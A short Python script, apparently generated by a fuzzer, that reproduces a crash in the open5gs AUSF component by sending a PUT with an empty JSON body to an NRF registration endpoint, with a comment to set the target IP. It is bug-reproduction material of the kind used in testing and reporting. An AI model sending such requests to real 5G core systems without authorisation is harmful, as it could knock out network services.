#!/usr/bin/env python3
# Crash reproduction for open5gs-ausf (info)
# Detected: Sat May  9 07:58:03 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/AUSF-fuzz-0001'
body = b'{}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
